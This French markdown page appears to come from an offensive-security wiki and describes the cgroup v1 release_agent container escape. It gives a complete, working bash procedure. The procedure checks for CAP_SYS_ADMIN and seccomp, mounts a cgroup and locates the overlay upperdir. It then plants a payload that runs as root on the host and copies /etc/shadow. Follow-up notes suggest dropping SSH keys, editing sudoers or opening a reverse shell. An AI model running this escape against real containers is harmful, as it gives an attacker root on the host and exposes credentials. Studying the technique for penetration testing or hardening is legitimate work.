---
title: "cgroups release_agent : exécuter un programme de l'hôte via un handler accessible en écriture"
description: "Le release_agent de cgroup v1 est un chemin que le noyau exécute en tant que root dans les espaces de noms de l'hôte lorsque la dernière tâche quitte un cgroup marqué notify_on_release. Un conteneur capable de monter une hiérarchie cgroup v1 et d'écrire release_agent force le noyau à exécuter un programme de l'attaquant sur l'hôte, une évasion fiable ne nécessitant que CAP_SYS_ADMIN et un contrôleur cgroup v1."
keywords:
  - release_agent
  - notify_on_release
  - cgroup v1
  - cap_sys_admin
  - évasion de conteneur
---

# cgroups release_agent

Le `release_agent` est une fonctionnalité de cgroup v1 : un chemin de programme que le noyau exécute, en tant que nouveau processus root dans les espaces de noms init de l'hôte, chaque fois que la dernière tâche quitte un cgroup dont `notify_on_release` est activé. Rien dans cette exécution n'est confiné au conteneur, car le noyau exécute l'agent depuis le contexte de système de fichiers et d'espaces de noms de l'hôte. Un conteneur capable de monter un contrôleur cgroup v1 et d'écrire les fichiers `release_agent` et `notify_on_release` dispose donc d'une voie directe, sans exploit, vers l'exécution de code sur l'hôte.

Préconditions : `CAP_SYS_ADMIN` (pour monter le système de fichiers cgroup), un appel système `mount` invocable (non bloqué par seccomp), et une hiérarchie cgroup v1 sur l'hôte.

```bash
grep CapEff /proc/self/status          # CAP_SYS_ADMIN present
grep Seccomp /proc/self/status         # 0 or a filter that permits mount
ls /sys/fs/cgroup/*/release_agent 2>/dev/null   # v1 hierarchies exist
mount | grep -q cgroup2 && echo "cgroup v2 present (release_agent may be absent)"
```

## La technique complète

```bash
# 1. Mount a cgroup v1 controller we control. "rdma" is chosen because it is
#    rarely already mounted; any v1 controller works.
mkdir /tmp/cg && mount -t cgroup -o rdma cgroup /tmp/cg
mkdir /tmp/cg/x

# 2. Mark the child cgroup so the kernel fires the agent when it empties
echo 1 > /tmp/cg/x/notify_on_release

# 3. The agent runs in the HOST filesystem view. Find where this container's
#    root maps on the host (overlay upperdir) so the payload path resolves there.
host=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)

# 4. Point release_agent at a payload under that host-visible path
echo "$host/x.sh" > /tmp/cg/release_agent

# 5. Write the payload (runs as root on the host)
cat > /x.sh <<SH
#!/bin/sh
id > $host/out 2>&1
cat /etc/shadow >> $host/out 2>&1
SH
chmod +x /x.sh

# 6. Trigger: put a short-lived task into the child cgroup, let it exit
sh -c "echo \$\$ > /tmp/cg/x/cgroup.procs"
sleep 1; cat /out
```

L'étape `upperdir` des points 3 et 4 est le point crucial. Le noyau résout `release_agent` dans le système de fichiers racine de l'hôte, de sorte qu'une charge utile écrite uniquement à `/x.sh` dans le conteneur ne serait pas trouvée ; écrire le chemin de l'agent sous l'emplacement `upperdir` de l'overlay rend le même inode accessible côté hôte, et le lire depuis `/proc/self/mountinfo` garde la technique portable.

## Variantes et modes d'échec

- **cgroup v2 uniquement** : un hôte purement en cgroup v2 n'a pas de fichier `release_agent` et le `mount -t cgroup` de l'étape 1 n'a aucun contrôleur v1 à rattacher ; la technique ne s'applique pas. Confirmez avec `mount | grep cgroup2` et l'absence de `release_agent`. Repliez-vous sur un module noyau ou un montage de disque.
- **seccomp bloque mount** : le profil seccomp Docker par défaut bloque `mount`, donc cette voie nécessite `seccomp=unconfined` en plus de la capacité ; voir [Seccomp ou AppArmor non confinés](unconfined-seccomp-or-apparmor.md).
- **pas de CAP_SYS_ADMIN** : sans elle, le montage échoue ; c'est pourquoi la technique est listée à la fois sous [CAP_SYS_ADMIN](capability-abuse/cap-sys-admin.md) et [Flag privileged](privileged-flag.md).

## Notes d'exploitation

- La charge utile s'exécute une fois, brièvement, en tant que root dans l'espace de noms init de l'hôte : utilisez-la pour déposer une clé SSH, ajouter une entrée sudoers ou lancer un reverse shell plutôt que de tenter de maintenir une session interactive via l'agent.
- La sortie doit être écrite vers un chemin visible depuis l'hôte (le même `upperdir`) pour la relire depuis l'intérieur du conteneur, comme le fait l'exemple avec `out`.

## Références

- [man 7 cgroups : notify_on_release and release_agent](https://man7.org/linux/man-pages/man7/cgroups.7.html)
- [Trail of Bits : Understanding Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [Unit 42 : release_agent container escape analysis](https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/)
